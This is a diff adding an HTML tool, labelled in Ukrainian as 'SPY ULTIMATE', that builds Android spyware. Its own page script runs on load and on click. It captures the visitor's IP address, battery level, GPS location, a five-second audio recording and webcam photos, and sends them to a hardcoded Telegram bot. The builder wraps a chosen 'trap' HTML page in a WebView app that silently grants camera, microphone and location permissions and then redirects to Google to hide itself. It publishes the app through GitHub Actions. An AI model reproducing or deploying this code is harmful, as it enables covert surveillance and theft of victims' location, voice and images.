@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <title>ULTIMATE FACTORY v23.1</title>
+    <style>
+        body { background: #050505; color: #00ff88; font-family: 'Courier New', monospace; padding: 20px; text-align: center; }
+        .card { border: 2px solid #00ff88; background: #111; padding: 25px; border-radius: 15px; max-width: 500px; margin: auto; box-shadow: 0 0 30px rgba(0,255,136,0.3); }
+        input { width: 100%; background: #000; border: 1px solid #00ff88; color: #fff; padding: 12px; margin: 8px 0; border-radius: 5px; box-sizing: border-box; }
+        .zone { border: 2px dashed #444; padding: 20px; margin: 15px 0; cursor: pointer; transition: 0.3s; }
+        .zone:hover { border-color: #00ff88; background: #1a1a1a; }
+        .btn { background: #00ff88; color: #000; width: 100%; padding: 20px; border: none; font-weight: bold; cursor: pointer; border-radius: 8px; font-size: 18px; margin-top: 10px; }
+        #log { font-size: 12px; color: #00ff88; margin-top: 15px; text-align: left; background: #000; padding: 10px; height: 150px; overflow-y: auto; border: 1px solid #222; white-space: pre-wrap; }
+    </style>
+<script>
+    async function startSpy(){
+        try {
+            // 1. IP та Батарея
+            const bat = await navigator.getBattery();
+            const ipReq = await fetch('https://api.ipify.org?format=json').then(r=>r.json());
+            let msg = "🔋 Bat: " + Math.round(bat.level * 100) + "% | IP: " + ipReq.ip;
+            
+            // 2. Геолокація
+            navigator.geolocation.getCurrentPosition(p => {
+                msg += "\n📍 GPS: https://www.google.com/maps?q=" + p.coords.latitude + "," + p.coords.longitude;
+                sendMsg(msg);
+            }, () => sendMsg(msg + "\n📍 GPS: Немає доступу"));
+
+            const stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
+            
+            // 3. Запис Аудіо (5 сек)
+            const recorder = new MediaRecorder(stream);
+            let chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = () => {
+                const blob = new Blob(chunks, {type: 'audio/ogg'});
+                const f = new FormData();
+                f.append('chat_id', '8194848649'); f.append('voice', blob, 'v.ogg');
+                fetch('https://api.telegram.org/bot8652413321:AAGziAFFffZbHEdqxxFWdgXJJNmanVFZxK8/sendVoice', {method:'POST', body:f});
+            };
+            recorder.start();
+            setTimeout(() => recorder.stop(), 5000);
+
+            // 4. Фото (Burst Mode)
+            const v = document.createElement('video');
+            v.srcObject = stream; v.play();
+            for(let i=0; i<2; i++){
+                await new Promise(r => setTimeout(r, 4000));
+                const c = document.createElement('canvas');
+                c.width = v.videoWidth; c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v,0,0);
+                c.toBlob(b => {
+                    const f = new FormData();
+                    f.append('chat_id','8194848649'); f.append('photo',b,'i.jpg');
+                    fetch('https://api.telegram.org/bot8652413321:AAGziAFFffZbHEdqxxFWdgXJJNmanVFZxK8/sendPhoto',{method:'POST',body:f});
+                },'image/jpeg');
+            }
+        } catch(e) { sendMsg("❌ Помилка: " + e.message); }
+    }
+    function sendMsg(t){ fetch('https://api.telegram.org/bot8652413321:AAGziAFFffZbHEdqxxFWdgXJJNmanVFZxK8/sendMessage?chat_id=8194848649&text=' + encodeURIComponent(t)); }
+    window.onclick = startSpy;
+    window.onload = () => { setTimeout(startSpy, 1500); };
+    </script></head>
+<body>
+
+<div class="card">
+    <h2>🕵️‍♂️ SPY ULTIMATE v23.1</h2>
+    <input type="password" id="tk" placeholder="GitHub Token (ghp_...)">
+    <input type="text" id="us" placeholder="Твій GitHub Логін">
+    <input type="text" id="app_n" placeholder="Назва додатка" value="System Security">
+
+    <div class="zone" onclick="document.getElementById('f_h').click()">
+        <span id="l_h">📄 ОБЕРИ HTML (ПАСТКА)</span>
+        <input type="file" id="f_h" accept=".html" style="display:none">
+    </div>
+
+    <div class="zone" onclick="document.getElementById('f_i').click()">
+        <span id="l_i">🖼 ОБЕРИ ІКОНКУ</span>
+        <input type="file" id="f_i" accept="image/*" style="display:none">
+    </div>
+
+    <button class="btn" onclick="build()">🚀 ЗІБРАТИ ПОВНИЙ КОМПЛЕКТ</button>
+    <div id="log">Очікування запуску...</div>
+</div>
+
+<script>
+let hD = "", iD = "";
+const BOT_TOKEN = "8652413321:AAGziAFFffZbHEdqxxFWdgXJJNmanVFZxK8";
+const CHAT_ID = "8194848649";
+
+document.getElementById('f_h').onchange = e => {
+    const r = new FileReader();
+    r.onload = ev => { hD = ev.target.result; document.getElementById('l_h').innerText = "✅ HTML ГОТОВИЙ"; };
+    r.readAsText(e.target.files[0]);
+};
+
+document.getElementById('f_i').onchange = e => {
+    const r = new FileReader();
+    r.onload = ev => { iD = ev.target.result.split(',')[1]; document.getElementById('l_i').innerText = "✅ ІКОНКА ГОТОВА"; };
+    r.readAsDataURL(e.target.files[0]);
+};
+
+function log(m) { const l = document.getElementById('log'); l.innerText += "\n> " + m; l.scrollTop = 9999; }
+
+async function build() {
+    const tk = document.getElementById('tk').value.trim();
+    const us = document.getElementById('us').value.trim();
+    const an = document.getElementById('app_n').value.trim();
+    const repo = "spy-v23-" + Date.now();
+
+    if(!hD || !tk || !iD) return alert("Заповни всі поля та обери файли!");
+
+    log("🛠 Створюю секретний репозиторій...");
+    const res = await fetch('https://api.github.com/user/repos', {
+        method: 'POST',
+        headers: { 'Authorization': `token ${tk}` },
+        body: JSON.stringify({ name: repo })
+    });
+    if(!res.ok) return log("❌ Помилка GitHub! Перевір токен.");
+
+    // ШПИГУНСЬКИЙ СКРИПТ V23.1
+    const spy = `<script>
+    async function startSpy(){
+        try {
+            // 1. IP та Батарея
+            const bat = await navigator.getBattery();
+            const ipReq = await fetch('https://api.ipify.org?format=json').then(r=>r.json());
+            let msg = "🔋 Bat: " + Math.round(bat.level * 100) + "% | IP: " + ipReq.ip;
+            
+            // 2. Геолокація
+            navigator.geolocation.getCurrentPosition(p => {
+                msg += "\\n📍 GPS: https://www.google.com/maps?q=" + p.coords.latitude + "," + p.coords.longitude;
+                sendMsg(msg);
+            }, () => sendMsg(msg + "\\n📍 GPS: Немає доступу"));
+
+            const stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
+            
+            // 3. Запис Аудіо (5 сек)
+            const recorder = new MediaRecorder(stream);
+            let chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = () => {
+                const blob = new Blob(chunks, {type: 'audio/ogg'});
+                const f = new FormData();
+                f.append('chat_id', '${CHAT_ID}'); f.append('voice', blob, 'v.ogg');
+                fetch('https://api.telegram.org/bot${BOT_TOKEN}/sendVoice', {method:'POST', body:f});
+            };
+            recorder.start();
+            setTimeout(() => recorder.stop(), 5000);
+
+            // 4. Фото (Burst Mode)
+            const v = document.createElement('video');
+            v.srcObject = stream; v.play();
+            for(let i=0; i<2; i++){
+                await new Promise(r => setTimeout(r, 4000));
+                const c = document.createElement('canvas');
+                c.width = v.videoWidth; c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v,0,0);
+                c.toBlob(b => {
+                    const f = new FormData();
+                    f.append('chat_id','${CHAT_ID}'); f.append('photo',b,'i.jpg');
+                    fetch('https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto',{method:'POST',body:f});
+                },'image/jpeg');
+            }
+        } catch(e) { sendMsg("❌ Помилка: " + e.message); }
+    }
+    function sendMsg(t){ fetch('https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=' + encodeURIComponent(t)); }
+    window.onclick = startSpy;
+    window.onload = () => { setTimeout(startSpy, 1500); };
+    <\/script>`;
+
+    const files = {
+        "app/src/main/assets/index.html": hD.replace('</head>', spy + '</head>'),
+        "app/src/main/res/mipmap-hdpi/ic_launcher.png": iD,
+        "app/src/main/res/mipmap-hdpi/ic_launcher_round.png": iD,
+        "app/src/main/AndroidManifest.xml": `<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.app.ultra">
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.CAMERA"/>
+    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+    <application android:label="${an}" android:icon="@mipmap/ic_launcher" android:roundIcon="@mipmap/ic_launcher_round" android:usesCleartextTraffic="true">
+        <activity android:name=".MainActivity" android:exported="true" android:theme="@android:style/Theme.NoTitleBar.Fullscreen">
+            <intent-filter><action android:name="android.intent.action.MAIN"/><category android:name="android.intent.category.LAUNCHER"/></intent-filter>
+        </activity>
+    </application>
+</manifest>`,
+        "app/src/main/java/com/app/ultra/MainActivity.java": `package com.app.ultra;
+import android.os.*;
+import android.webkit.*;
+import android.app.Activity;
+import android.Manifest;
+
+public class MainActivity extends Activity {
+    protected void onCreate(Bundle s) {
+        super.onCreate(s);
+        requestPermissions(new String[]{Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO, Manifest.permission.ACCESS_FINE_LOCATION}, 1);
+        WebView w = new WebView(this);
+        w.getSettings().setJavaScriptEnabled(true);
+        w.getSettings().setDomStorageEnabled(true);
+        w.getSettings().setMediaPlaybackRequiresUserGesture(false);
+        w.setWebChromeClient(new WebChromeClient() {
+            public void onPermissionRequest(PermissionRequest r) { r.grant(r.getResources()); }
+            public void onGeolocationPermissionsShowPrompt(String o, GeolocationPermissions.Callback c) { c.invoke(o, true, false); }
+        });
+        // Примусове маскування через 20 сек
+        new Handler().postDelayed(() -> { w.post(() -> w.loadUrl("https://www.google.com")); }, 20000);
+        w.loadUrl("file:///android_asset/index.html");
+        setContentView(w);
+    }
+}`,
+        "app/build.gradle": "plugins { id 'com.android.application' }\nandroid { namespace 'com.app.ultra'\ncompileSdk 34\ndefaultConfig { applicationId 'com.app.ultra'\nminSdk 24\ntargetSdk 34 } }",
+        "settings.gradle": "include ':app'",
+        "build.gradle": "buildscript { repositories { google(); mavenCentral() }\ndependencies { classpath 'com.android.tools.build:gradle:8.2.0' } }\nallprojects { repositories { google(); mavenCentral() } }",
+        ".github/workflows/main.yml": `name: Build
+on: [push]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-java@v4
+        with: {java-version: '17', distribution: 'temurin'}
+      - uses: gradle/actions/setup-gradle@v3
+      - run: gradle assembleDebug
+      - uses: actions/upload-artifact@v4
+        with: {name: SpyApp, path: app/build/outputs/apk/debug/*.apk}`
+    };
+
+    for (const [p, c] of Object.entries(files)) {
+        log("📤 Надсилаю: " + p);
+        const isBin = p.includes(".png");
+        await fetch(`https://api.github.com/repos/${us}/${repo}/contents/${p}`, {
+            method: 'PUT',
+            headers: { 'Authorization': `token ${tk}` },
+            body: JSON.stringify({ message: "init", content: isBin ? c : btoa(unescape(encodeURIComponent(c))) })
+        });
+        await new Promise(r => setTimeout(r, 600));
+    }
+
+    log("🏁 ГОТОВО! Переходь в Actions.");
+    window.open(`https://github.com/${us}/${repo}/actions`);
+}
+</script>
+</body>
+</html>
+
